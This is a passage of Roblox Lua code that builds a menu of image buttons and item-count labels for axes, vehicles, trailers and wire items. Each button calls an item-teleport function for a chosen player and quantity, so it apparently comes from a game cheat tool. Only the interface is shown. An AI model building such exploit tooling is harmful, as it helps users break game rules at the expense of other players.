CountItems65.BackgroundTransparency = 0.6
CountItems65.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems65.Position = UDim2.new(0, 110, 0, 370)
CountItems65.Size = UDim2.new(0, 25, 0, 20)
CountItems65.Font = Enum.Font.SourceSans
CountItems65.Text = "0"
CountItems65.TextColor3 = Color3.new(0, 1, 0)
CountItems65.TextSize = 25

Rukiryaxe = Instance.new("ImageButton")
Rukiryaxe.Name = "Rukiryaxe"
Rukiryaxe.Parent = MoveAxes
Rukiryaxe.BackgroundColor3 = Color3.new(1, 1, 1)
Rukiryaxe.BackgroundTransparency = 1
Rukiryaxe.BorderColor3 = Color3.new(0.6, 0, 0)
Rukiryaxe.Position = UDim2.new(0, 5, 0, 420)
Rukiryaxe.Size = UDim2.new(0, 100, 0, 100)
Rukiryaxe.Image = "rbxassetid://3210434960"
Rukiryaxe.MouseButton1Down:connect(function()
Type.Text = "Rukiry Axe"
SingleItemTpQty("Rukiryaxe", PlyrSelz.Text, qty.Text)
end)

CountItems66 = Instance.new("TextLabel")
CountItems66.Parent = MoveAxes
CountItems66.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems66.BackgroundTransparency = 0.6
CountItems66.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems66.Position = UDim2.new(0, 110, 0, 475)
CountItems66.Size = UDim2.new(0, 25, 0, 20)
CountItems66.Font = Enum.Font.SourceSans
CountItems66.Text = "0"
CountItems66.TextColor3 = Color3.new(0, 1, 0)
CountItems66.TextSize = 25

Axe3 = Instance.new("ImageButton")
Axe3.Name = "Axe3"
Axe3.Parent = MoveAxes
Axe3.BackgroundColor3 = Color3.new(1, 1, 1)
Axe3.BackgroundTransparency = 1
Axe3.BorderColor3 = Color3.new(0.6, 0, 0)
Axe3.Position = UDim2.new(0, 5, 0, 525)
Axe3.Size = UDim2.new(0, 100, 0, 100)
Axe3.Image = "rbxassetid://3210412765"
Axe3.MouseButton1Down:connect(function()
Type.Text = "Hardened Axe"
SingleItemTpQty("Axe3", PlyrSelz.Text, qty.Text)
end)

CountItems67 = Instance.new("TextLabel")
CountItems67.Parent = MoveAxes
CountItems67.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems67.BackgroundTransparency = 0.6
CountItems67.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems67.Position = UDim2.new(0, 110, 0, 580)
CountItems67.Size = UDim2.new(0, 25, 0, 20)
CountItems67.Font = Enum.Font.SourceSans
CountItems67.Text = "0"
CountItems67.TextColor3 = Color3.new(0, 1, 0)
CountItems67.TextSize = 25

AxeBetaTesters = Instance.new("ImageButton")
AxeBetaTesters.Name = "AxeBetaTesters"
AxeBetaTesters.Parent = MoveAxes
AxeBetaTesters.BackgroundColor3 = Color3.new(1, 1, 1)
AxeBetaTesters.BackgroundTransparency = 1
AxeBetaTesters.BorderColor3 = Color3.new(0.6, 0, 0)
AxeBetaTesters.Position = UDim2.new(0, 5, 0, 630)
AxeBetaTesters.Size = UDim2.new(0, 100, 0, 100)
AxeBetaTesters.Image = "rbxassetid://3210421564"
AxeBetaTesters.MouseButton1Down:connect(function()
SingleItemTpQty("AxeBetaTesters", PlyrSelz.Text, qty.Text)
Type.Text = "AxeBetaTesters"
end)

CountItems68 = Instance.new("TextLabel")
CountItems68.Parent = MoveAxes
CountItems68.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems68.BackgroundTransparency = 0.6
CountItems68.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems68.Position = UDim2.new(0, 110, 0, 685)
CountItems68.Size = UDim2.new(0, 25, 0, 20)
CountItems68.Font = Enum.Font.SourceSans
CountItems68.Text = "0"
CountItems68.TextColor3 = Color3.new(0, 1, 0)
CountItems68.TextSize = 25

FireAxe = Instance.new("ImageButton")
FireAxe.Name = "FireAxe"
FireAxe.Parent = MoveAxes
FireAxe.BackgroundColor3 = Color3.new(1, 1, 1)
FireAxe.BackgroundTransparency = 1
FireAxe.BorderColor3 = Color3.new(0.6, 0, 0)
FireAxe.Position = UDim2.new(0, 5, 0, 735)
FireAxe.Size = UDim2.new(0, 100, 0, 100)
FireAxe.Image = "rbxassetid://3210431558"
FireAxe.MouseButton1Down:connect(function()
Type.Text = "Fire Axe"
SingleItemTpQty("FireAxe", PlyrSelz.Text, qty.Text)
end)

CountItems69 = Instance.new("TextLabel")
CountItems69.Parent = MoveAxes
CountItems69.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems69.BackgroundTransparency = 0.6
CountItems69.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems69.Position = UDim2.new(0, 110, 0, 790)
CountItems69.Size = UDim2.new(0, 25, 0, 20)
CountItems69.Font = Enum.Font.SourceSans
CountItems69.Text = "0"
CountItems69.TextColor3 = Color3.new(0, 1, 0)
CountItems69.TextSize = 25

SilverAxe = Instance.new("ImageButton")
SilverAxe.Name = "SilverAxe"
SilverAxe.Parent = MoveAxes
SilverAxe.BackgroundColor3 = Color3.new(1, 1, 1)
SilverAxe.BackgroundTransparency = 1
SilverAxe.BorderColor3 = Color3.new(0.6, 0, 0)
SilverAxe.Position = UDim2.new(0, 5, 0, 840)
SilverAxe.Size = UDim2.new(0, 100, 0, 100)
SilverAxe.Image = "rbxassetid://3210436244"
SilverAxe.MouseButton1Down:connect(function()
Type.Text = "Silver Axe"
SingleItemTpQty("SilverAxe", PlyrSelz.Text, qty.Text)
end)

CountItems70 = Instance.new("TextLabel")
CountItems70.Parent = MoveAxes
CountItems70.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems70.BackgroundTransparency = 0.6
CountItems70.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems70.Position = UDim2.new(0, 110, 0, 895)
CountItems70.Size = UDim2.new(0, 25, 0, 20)
CountItems70.Font = Enum.Font.SourceSans
CountItems70.Text = "0"
CountItems70.TextColor3 = Color3.new(0, 1, 0)
CountItems70.TextSize = 25

EndTimesAxe = Instance.new("ImageButton")
EndTimesAxe.Name = "EndTimesAxe"
EndTimesAxe.Parent = MoveAxes
EndTimesAxe.BackgroundColor3 = Color3.new(1, 1, 1)
EndTimesAxe.BackgroundTransparency = 1
EndTimesAxe.BorderColor3 = Color3.new(0.6, 0, 0)
EndTimesAxe.Position = UDim2.new(0, 5, 0, 945)
EndTimesAxe.Size = UDim2.new(0, 100, 0, 100)
EndTimesAxe.Image = "rbxassetid://3210430490"
EndTimesAxe.MouseButton1Down:connect(function()
Type.Text = "End Times Axe"
SingleItemTpQty("EndTimesAxe", PlyrSelz.Text, qty.Text)
end)

CountItems71 = Instance.new("TextLabel")
CountItems71.Parent = MoveAxes
CountItems71.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems71.BackgroundTransparency = 0.6
CountItems71.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems71.Position = UDim2.new(0, 110, 0, 1000)
CountItems71.Size = UDim2.new(0, 25, 0, 20)
CountItems71.Font = Enum.Font.SourceSans
CountItems71.Text = "0"
CountItems71.TextColor3 = Color3.new(0, 1, 0)
CountItems71.TextSize = 25

AxeChicken = Instance.new("ImageButton")
AxeChicken.Name = "AxeChicken"
AxeChicken.Parent = MoveAxes
AxeChicken.BackgroundColor3 = Color3.new(1, 1, 1)
AxeChicken.BackgroundTransparency = 1
AxeChicken.BorderColor3 = Color3.new(0.6, 0, 0)
AxeChicken.Position = UDim2.new(0, 5, 0, 1050)
AxeChicken.Size = UDim2.new(0, 100, 0, 100)
AxeChicken.Image = "rbxassetid://3210423009"
AxeChicken.MouseButton1Down:connect(function()
Type.Text = "Chicken Axe"
SingleItemTpQty("AxeChicken", PlyrSelz.Text, qty.Text)
end)

CountItems72 = Instance.new("TextLabel")
CountItems72.Parent = MoveAxes
CountItems72.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems72.BackgroundTransparency = 0.6
CountItems72.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems72.Position = UDim2.new(0, 110, 0, 1105)
CountItems72.Size = UDim2.new(0, 25, 0, 20)
CountItems72.Font = Enum.Font.SourceSans
CountItems72.Text = "0"
CountItems72.TextColor3 = Color3.new(0, 1, 0)
CountItems72.TextSize = 25

CandyCaneAxe = Instance.new("ImageButton")
CandyCaneAxe.Name = "CandyCaneAxe"
CandyCaneAxe.Parent = MoveAxes
CandyCaneAxe.BackgroundColor3 = Color3.new(1, 1, 1)
CandyCaneAxe.BackgroundTransparency = 1
CandyCaneAxe.BorderColor3 = Color3.new(0.6, 0, 0)
CandyCaneAxe.Position = UDim2.new(0, 5, 0, 1155)
CandyCaneAxe.Size = UDim2.new(0, 100, 0, 100)
CandyCaneAxe.Image = "rbxassetid://3210428043"
CandyCaneAxe.MouseButton1Down:connect(function()
Type.Text = "Candy Cane Axe"
SingleItemTpQty("CandyCaneAxe", PlyrSelz.Text, qty.Text)
end)

CountItems73 = Instance.new("TextLabel")
CountItems73.Parent = MoveAxes
CountItems73.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems73.BackgroundTransparency = 0.6
CountItems73.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems73.Position = UDim2.new(0, 110, 0, 1210)
CountItems73.Size = UDim2.new(0, 25, 0, 20)
CountItems73.Font = Enum.Font.SourceSans
CountItems73.Text = "0"
CountItems73.TextColor3 = Color3.new(0, 1, 0)
CountItems73.TextSize = 25

Beesaxe = Instance.new("ImageButton")
Beesaxe.Name = "Beesaxe"
Beesaxe.Parent = MoveAxes
Beesaxe.BackgroundColor3 = Color3.new(1, 1, 1)
Beesaxe.BackgroundTransparency = 1
Beesaxe.BorderColor3 = Color3.new(0.6, 0, 0)
Beesaxe.Position = UDim2.new(0, 5, 0, 1260)
Beesaxe.Size = UDim2.new(0, 100, 0, 100)
Beesaxe.Image = "rbxassetid://3210427203"
Beesaxe.MouseButton1Down:connect(function()
Type.Text = "Bees Axe"
SingleItemTpQty("Beesaxe", PlyrSelz.Text, qty.Text)
end)

CountItems74 = Instance.new("TextLabel")
CountItems74.Parent = MoveAxes
CountItems74.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems74.BackgroundTransparency = 0.6
CountItems74.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems74.Position = UDim2.new(0, 110, 0, 1315)
CountItems74.Size = UDim2.new(0, 25, 0, 20)
CountItems74.Font = Enum.Font.SourceSans
CountItems74.Text = "0"
CountItems74.TextColor3 = Color3.new(0, 1, 0)
CountItems74.TextSize = 25

AxeAmber = Instance.new("ImageButton")
AxeAmber.Name = "AxeAmber"
AxeAmber.Parent = MoveAxes
AxeAmber.BackgroundColor3 = Color3.new(1, 1, 1)
AxeAmber.BackgroundTransparency = 1
AxeAmber.BorderColor3 = Color3.new(0.6, 0, 0)
AxeAmber.Position = UDim2.new(0, 5, 0, 1365)
AxeAmber.Size = UDim2.new(0, 100, 0, 100)
AxeAmber.Image = "rbxassetid://3210420154"
AxeAmber.MouseButton1Down:connect(function()
Type.Text = "Amber Axe"
SingleItemTpQty("AxeAmber", PlyrSelz.Text, qty.Text)
end)

CountItems75 = Instance.new("TextLabel")
CountItems75.Parent = MoveAxes
CountItems75.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems75.BackgroundTransparency = 0.6
CountItems75.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems75.Position = UDim2.new(0, 110, 0, 1420)
CountItems75.Size = UDim2.new(0, 25, 0, 20)
CountItems75.Font = Enum.Font.SourceSans
CountItems75.Text = "0"
CountItems75.TextColor3 = Color3.new(0, 1, 0)
CountItems75.TextSize = 25

GingerbreadAxe = Instance.new("ImageButton")
GingerbreadAxe.Name = "GingerbreadAxe"
GingerbreadAxe.Parent = MoveAxes
GingerbreadAxe.BackgroundColor3 = Color3.new(1, 1, 1)
GingerbreadAxe.BackgroundTransparency = 1
GingerbreadAxe.BorderColor3 = Color3.new(0.6, 0, 0)
GingerbreadAxe.Position = UDim2.new(0, 5, 0, 1470)
GingerbreadAxe.Size = UDim2.new(0, 100, 0, 100)
GingerbreadAxe.Image = "rbxassetid://3702955535"
GingerbreadAxe.MouseButton1Down:connect(function()
Type.Text = "Gingerbread Axe"
SingleItemTpQty("GingerbreadAxe", PlyrSelz.Text, qty.Text)
end)

CountItems76 = Instance.new("TextLabel")
CountItems76.Parent = MoveAxes
CountItems76.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems76.BackgroundTransparency = 0.6
CountItems76.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems76.Position = UDim2.new(0, 110, 0, 1525)
CountItems76.Size = UDim2.new(0, 25, 0, 20)
CountItems76.Font = Enum.Font.SourceSans
CountItems76.Text = "0"
CountItems76.TextColor3 = Color3.new(0, 1, 0)
CountItems76.TextSize = 25

ManyAxe = Instance.new("ImageButton")
ManyAxe.Name = "ManyAxe"
ManyAxe.Parent = MoveAxes
ManyAxe.BackgroundColor3 = Color3.new(1, 1, 1)
ManyAxe.BackgroundTransparency = 1
ManyAxe.BorderColor3 = Color3.new(0.6, 0, 0)
ManyAxe.Position = UDim2.new(0, 5, 0, 1575)
ManyAxe.Size = UDim2.new(0, 100, 0, 100)
ManyAxe.Image = "rbxassetid://5057952915"
ManyAxe.MouseButton1Down:connect(function()
Type.Text = "Many Axe"
SingleItemTpQty("ManyAxe", PlyrSelz.Text, qty.Text)
end)

CountItems77 = Instance.new("TextLabel")
CountItems77.Parent = MoveAxes
CountItems77.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems77.BackgroundTransparency = 0.6
CountItems77.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems77.Position = UDim2.new(0, 110, 0, 1630)
CountItems77.Size = UDim2.new(0, 25, 0, 20)
CountItems77.Font = Enum.Font.SourceSans
CountItems77.Text = "0"
CountItems77.TextColor3 = Color3.new(0, 1, 0)
CountItems77.TextSize = 25

AxeTwitter = Instance.new("ImageButton")
AxeTwitter.Name = "AxeTwitter"
AxeTwitter.Parent = MoveAxes
AxeTwitter.BackgroundColor3 = Color3.new(1, 1, 1)
AxeTwitter.BackgroundTransparency = 1
AxeTwitter.BorderColor3 = Color3.new(0.6, 0, 0)
AxeTwitter.Position = UDim2.new(0, 5, 0, 1680)
AxeTwitter.Size = UDim2.new(0, 100, 0, 100)
AxeTwitter.Image = "rbxassetid://3210424323"
AxeTwitter.MouseButton1Down:connect(function()
Type.Text = "Twitter Axe"
SingleItemTpQty("AxeTwitter", PlyrSelz.Text, qty.Text)
end)

CountItems78 = Instance.new("TextLabel")
CountItems78.Parent = MoveAxes
CountItems78.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems78.BackgroundTransparency = 0.6
CountItems78.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems78.Position = UDim2.new(0, 110, 0, 1735)
CountItems78.Size = UDim2.new(0, 25, 0, 20)
CountItems78.Font = Enum.Font.SourceSans
CountItems78.Text = "0"
CountItems78.TextColor3 = Color3.new(0, 1, 0)
CountItems78.TextSize = 25

RustyAxe = Instance.new("ImageButton")
RustyAxe.Name = "RustyAxe"
RustyAxe.Parent = MoveAxes
RustyAxe.BackgroundColor3 = Color3.new(1, 1, 1)
RustyAxe.BackgroundTransparency = 1
RustyAxe.BorderColor3 = Color3.new(0.6, 0, 0)
RustyAxe.Position = UDim2.new(0, 5, 0, 1785)
RustyAxe.Size = UDim2.new(0, 100, 0, 100)
RustyAxe.Image = "rbxassetid://4481885638"
RustyAxe.MouseButton1Down:connect(function()
Type.Text = "Rusty Axe"
SingleItemTpQty("RustyAxe", PlyrSelz.Text, qty.Text)
end)

CountItems79 = Instance.new("TextLabel")
CountItems79.Parent = MoveAxes
CountItems79.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems79.BackgroundTransparency = 0.6
CountItems79.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems79.Position = UDim2.new(0, 110, 0, 1840)
CountItems79.Size = UDim2.new(0, 25, 0, 20)
CountItems79.Font = Enum.Font.SourceSans
CountItems79.Text = "0"
CountItems79.TextColor3 = Color3.new(0, 1, 0)
CountItems79.TextSize = 25

CaveAxe = Instance.new("ImageButton")
CaveAxe.Name = "CaveAxe"
CaveAxe.Parent = MoveAxes
CaveAxe.BackgroundColor3 = Color3.new(1, 1, 1)
CaveAxe.BackgroundTransparency = 1
CaveAxe.BorderColor3 = Color3.new(0.6, 0, 0)
CaveAxe.Position = UDim2.new(0, 5, 0, 1890)
CaveAxe.Size = UDim2.new(0, 100, 0, 100)
CaveAxe.Image = "rbxassetid://4481884766"
CaveAxe.MouseButton1Down:connect(function()
Type.Text = "Cave Axe"
SingleItemTpQty("CaveAxe", PlyrSelz.Text, qty.Text)
end)

CountItems80 = Instance.new("TextLabel")
CountItems80.Parent = MoveAxes
CountItems80.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems80.BackgroundTransparency = 0.6
CountItems80.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems80.Position = UDim2.new(0, 110, 0, 1945)
CountItems80.Size = UDim2.new(0, 35, 0, 35)
CountItems80.Font = Enum.Font.SourceSans
CountItems80.Text = "0"
CountItems80.TextColor3 = Color3.new(0, 1, 0)
CountItems80.TextSize = 25

MoveVehicle = Instance.new("ScrollingFrame")
MoveVehicle.Name = "MoveVehicle"
MoveVehicle.Parent = MenuFrame
MoveVehicle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveVehicle.BackgroundTransparency = 0.5
MoveVehicle.Position =  UDim2.new(0, 179, 0, 0)
MoveVehicle.BorderColor3 = Color3.new(0, 0, 0)
MoveVehicle.Size = UDim2.new(0, 195, 0, 450)
MoveVehicle.CanvasPosition = Vector2.new(0,0)
MoveVehicle.CanvasSize = UDim2.new(0, 0, 0, 650)
MoveVehicle.Visible = false

VehicleMove = Instance.new("TextButton")
VehicleMove.Name = "VehicleMove"
VehicleMove.Parent = MoveFrame
VehicleMove.BackgroundColor3 = Color3.new(0, 0, 0)
VehicleMove.BorderColor3 = Color3.new(1, 0, 0)
VehicleMove.BackgroundTransparency = 0.6
VehicleMove.Position =  UDim2.new(0, 3, 0, 188)
VehicleMove.Size = UDim2.new(0, 164, 0, 20)
VehicleMove.Font = Enum.Font.Fantasy
VehicleMove.Text = "Sort Vehicles"
VehicleMove.TextColor3 = Color3.new(1, 1, 1)
VehicleMove.TextSize = 14
VehicleMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

UtilityTruck = Instance.new("ImageButton")
UtilityTruck.Name = "UtilityTruck"
UtilityTruck.Parent = MoveVehicle
UtilityTruck.BackgroundColor3 = Color3.new(1, 1, 1)
UtilityTruck.BackgroundTransparency = 1
UtilityTruck.BorderColor3 = Color3.new(0.6, 0, 0)
UtilityTruck.Position = UDim2.new(0, 5, 0, 5)
UtilityTruck.Size = UDim2.new(0, 100, 0, 100)
UtilityTruck.Image = "rbxassetid://3704340394"
UtilityTruck.MouseButton1Down:connect(function()
Type.Text = "Utility  Vehicle"
SingleItemTpQty("UtilityTruck", PlyrSelz.Text, qty.Text)
end)

CountItems81 = Instance.new("TextLabel")
CountItems81.Parent = MoveVehicle
CountItems81.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems81.BackgroundTransparency = 0.6
CountItems81.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems81.Position = UDim2.new(0, 110, 0, 55)
CountItems81.Size = UDim2.new(0, 25, 0, 20)
CountItems81.Font = Enum.Font.SourceSans
CountItems81.Text = "0"
CountItems81.TextColor3 = Color3.new(0, 1, 0)
CountItems81.TextSize = 25

UtilityTruck2 = Instance.new("ImageButton")
UtilityTruck2.Name = "FillCaveCrawler"
UtilityTruck2.Parent = MoveVehicle
UtilityTruck2.BackgroundColor3 = Color3.new(1, 1, 1)
UtilityTruck2.BackgroundTransparency = 1
UtilityTruck2.BorderColor3 = Color3.new(0.6, 0, 0)
UtilityTruck2.Position = UDim2.new(0, 5, 0, 105)
UtilityTruck2.Size = UDim2.new(0, 100, 0, 100)
UtilityTruck2.Image = "rbxassetid://3704340789"
UtilityTruck2.MouseButton1Down:connect(function()
Type.Text = "Utility Vehicle XL"
SingleItemTpQty("UtilityTruck2", PlyrSelz.Text, qty.Text)
end)

CountItems82 = Instance.new("TextLabel")
CountItems82.Parent = MoveVehicle
CountItems82.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems82.BackgroundTransparency = 0.6
CountItems82.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems82.Position = UDim2.new(0, 110, 0, 160)
CountItems82.Size = UDim2.new(0, 25, 0, 20)
CountItems82.Font = Enum.Font.SourceSans
CountItems82.Text = "0"
CountItems82.TextColor3 = Color3.new(0, 1, 0)
CountItems82.TextSize = 25

Pickup1 = Instance.new("ImageButton")
Pickup1.Name = "Pickup1"
Pickup1.Parent = MoveVehicle
Pickup1.BackgroundColor3 = Color3.new(1, 1, 1)
Pickup1.BackgroundTransparency = 1
Pickup1.BorderColor3 = Color3.new(0.6, 0, 0)
Pickup1.Position = UDim2.new(0, 5, 0, 210)
Pickup1.Size = UDim2.new(0, 100, 0, 100)
Pickup1.Image = "rbxassetid://3704338309"
Pickup1.MouseButton1Down:connect(function()
Type.Text = "Pickup"
SingleItemTpQty("Pickup1", PlyrSelz.Text, qty.Text)
end)

CountItems83 = Instance.new("TextLabel")
CountItems83.Parent = MoveVehicle
CountItems83.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems83.BackgroundTransparency = 0.6
CountItems83.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems83.Position = UDim2.new(0, 110, 0, 265)
CountItems83.Size = UDim2.new(0, 25, 0, 35)
CountItems83.Font = Enum.Font.SourceSans
CountItems83.Text = "0"
CountItems83.TextColor3 = Color3.new(0, 1, 0)
CountItems83.TextSize = 25

SmallTrailer = Instance.new("ImageButton")
SmallTrailer.Name = "SmallTrailer"
SmallTrailer.Parent = MoveVehicle
SmallTrailer.BackgroundColor3 = Color3.new(1, 1, 1)
SmallTrailer.BackgroundTransparency = 1
SmallTrailer.BorderColor3 = Color3.new(0.6, 0, 0)
SmallTrailer.Position = UDim2.new(0, 5, 0, 315)
SmallTrailer.Size = UDim2.new(0, 100, 0, 100)
SmallTrailer.Image = "rbxassetid://3709024603"
SmallTrailer.MouseButton1Down:connect(function()
Type.Text = "Small Trailer"
SingleItemTpQty("SmallTrailer", PlyrSelz.Text, qty.Text)
end)

CountItems84 = Instance.new("TextLabel")
CountItems84.Parent = MoveVehicle
CountItems84.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems84.BackgroundTransparency = 0.6
CountItems84.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems84.Position = UDim2.new(0, 110, 0, 370)
CountItems84.Size = UDim2.new(0, 25, 0, 20)
CountItems84.Font = Enum.Font.SourceSans
CountItems84.Text = "0"
CountItems84.TextColor3 = Color3.new(0, 1, 0)
CountItems84.TextSize = 25

Trailer2 = Instance.new("ImageButton")
Trailer2.Name = "Trailer2"
Trailer2.Parent = MoveVehicle
Trailer2.BackgroundColor3 = Color3.new(1, 1, 1)
Trailer2.BackgroundTransparency = 1
Trailer2.BorderColor3 = Color3.new(0.6, 0, 0)
Trailer2.Position = UDim2.new(0, 5, 0, 420)
Trailer2.Size = UDim2.new(0, 100, 0, 100)
Trailer2.Image = "rbxassetid://3704340009"
Trailer2.MouseButton1Down:connect(function()
Type.Text = "531 Hauler"
SingleItemTpQty("Trailer2", PlyrSelz.Text, qty.Text)
end)

CountItems85 = Instance.new("TextLabel")
CountItems85.Parent = MoveVehicle
CountItems85.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems85.BackgroundTransparency = 0.6
CountItems85.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems85.Position = UDim2.new(0, 110, 0, 475)
CountItems85.Size = UDim2.new(0, 25, 0, 20)
CountItems85.Font = Enum.Font.SourceSans
CountItems85.Text = "0"
CountItems85.TextColor3 = Color3.new(0, 1, 0)
CountItems85.TextSize = 25

Sleigh = Instance.new("ImageButton")
Sleigh.Name = "Sleigh"
Sleigh.Parent = MoveVehicle
Sleigh.BackgroundColor3 = Color3.new(1, 1, 1)
Sleigh.BackgroundTransparency = 1
Sleigh.BorderColor3 = Color3.new(0.6, 0, 0)
Sleigh.Position = UDim2.new(0, 5, 0, 525)
Sleigh.Size = UDim2.new(0, 100, 0, 100)
Sleigh.Image = "rbxassetid://3704339385"
Sleigh.MouseButton1Down:connect(function()
Type.Text = "Sleigh"
SingleItemTpQty("Sleigh", PlyrSelz.Text, qty.Text)
end)

CountItems86 = Instance.new("TextLabel")
CountItems86.Parent = MoveVehicle
CountItems86.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems86.BackgroundTransparency = 0.6
CountItems86.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems86.Position = UDim2.new(0, 110, 0, 580)
CountItems86.Size = UDim2.new(0, 25, 0, 20)
CountItems86.Font = Enum.Font.SourceSans
CountItems86.Text = "0"
CountItems86.TextColor3 = Color3.new(0, 1, 0)
CountItems86.TextSize = 25

MoveWire = Instance.new("ScrollingFrame")
MoveWire.Name = "MoveWire"
MoveWire.Parent = MenuFrame
MoveWire.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveWire.BackgroundTransparency = 0.5
MoveWire.Position =  UDim2.new(0, 179, 0, 0)
MoveWire.BorderColor3 = Color3.new(0, 0, 0)
MoveWire.Size = UDim2.new(0, 195, 0, 450)
MoveWire.CanvasPosition = Vector2.new(0,0)
MoveWire.CanvasSize = UDim2.new(0, 0, 0, 3250)
MoveWire.Visible = false

WireMove = Instance.new("TextButton")
WireMove.Name = "WireMove"
WireMove.Parent = MoveFrame
WireMove.BackgroundColor3 = Color3.new(0, 0, 0)
WireMove.BorderColor3 = Color3.new(1, 0, 0)
WireMove.BackgroundTransparency = 0.6
WireMove.Position =  UDim2.new(0, 3, 0, 211)
WireMove.Size = UDim2.new(0, 164, 0, 20)
WireMove.Font = Enum.Font.Fantasy
WireMove.Text = "Sort Wire Items"
WireMove.TextColor3 = Color3.new(1, 1, 1)
WireMove.TextSize = 14
WireMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

Wire = Instance.new("ImageButton")
Wire.Name = "Wire"
Wire.Parent = MoveWire
Wire.BackgroundColor3 = Color3.new(1, 1, 1)
Wire.BackgroundTransparency = 1
Wire.BorderColor3 = Color3.new(0.6, 0, 0)
Wire.Position = UDim2.new(0, 5, 0, 5)
Wire.Size = UDim2.new(0, 100, 0, 100)
Wire.Image = "rbxassetid://3709112709"
Wire.MouseButton1Down:connect(function()
Type.Text = "Wire"
SingleItemTpQty("Wire", PlyrSelz.Text, qty.Text)
end)

CountItems87 = Instance.new("TextLabel")
CountItems87.Parent = MoveWire
CountItems87.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems87.BackgroundTransparency = 0.6
CountItems87.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems87.Position = UDim2.new(0, 110, 0, 55)
CountItems87.Size = UDim2.new(0, 25, 0, 20)
CountItems87.Font = Enum.Font.SourceSans
CountItems87.Text = "0"
CountItems87.TextColor3 = Color3.new(0, 1, 0)
CountItems87.TextSize = 25

Lever0 = Instance.new("ImageButton")
Lever0.Name = "Lever0"
Lever0.Parent = MoveWire
Lever0.BackgroundColor3 = Color3.new(1, 1, 1)
Lever0.BackgroundTransparency = 1
Lever0.BorderColor3 = Color3.new(0.6, 0, 0)
Lever0.Position = UDim2.new(0, 5, 0, 105)
Lever0.Size = UDim2.new(0, 100, 0, 100)
Lever0.Image = "rbxassetid://3709107707"
Lever0.MouseButton1Down:connect(function()
Type.Text = "Lever"
SingleItemTpQty("Lever0", PlyrSelz.Text, qty.Text)
end)

CountItems88 = Instance.new("TextLabel")
CountItems88.Parent = MoveWire
CountItems88.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems88.BackgroundTransparency = 0.6
CountItems88.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems88.Position = UDim2.new(0, 110, 0, 160)
CountItems88.Size = UDim2.new(0, 25, 0, 20)
CountItems88.Font = Enum.Font.SourceSans
CountItems88.Text = "0"
CountItems88.TextColor3 = Color3.new(0, 1, 0)
CountItems88.TextSize = 25

Button0 = Instance.new("ImageButton")
Button0.Name = "Button0"
Button0.Parent = MoveWire
Button0.BackgroundColor3 = Color3.new(1, 1, 1)
Button0.BackgroundTransparency = 1
Button0.BorderColor3 = Color3.new(0.6, 0, 0)
Button0.Position = UDim2.new(0, 5, 0, 210)
Button0.Size = UDim2.new(0, 100, 0, 100)
Button0.Image = "rbxassetid://3709101697"
Button0.MouseButton1Down:connect(function()
Type.Text = "Button"
SingleItemTpQty("Button0", PlyrSelz.Text, qty.Text)
end)

CountItems89 = Instance.new("TextLabel")
CountItems89.Parent = MoveWire
CountItems89.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems89.BackgroundTransparency = 0.6
CountItems89.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems89.Position = UDim2.new(0, 110, 0, 265)
CountItems89.Size = UDim2.new(0, 25, 0, 20)
CountItems89.Font = Enum.Font.SourceSans
CountItems89.Text = "0"
CountItems89.TextColor3 = Color3.new(0, 1, 0)
CountItems89.TextSize = 25

ChopSaw = Instance.new("ImageButton")
ChopSaw.Name = "ChopSaw"
ChopSaw.Parent = MoveWire
ChopSaw.BackgroundColor3 = Color3.new(1, 1, 1)
ChopSaw.BackgroundTransparency = 1
ChopSaw.BorderColor3 = Color3.new(0.6, 0, 0)
ChopSaw.Position = UDim2.new(0, 5, 0, 315)
ChopSaw.Size = UDim2.new(0, 100, 0, 100)
ChopSaw.Image = "rbxassetid://3709101992"
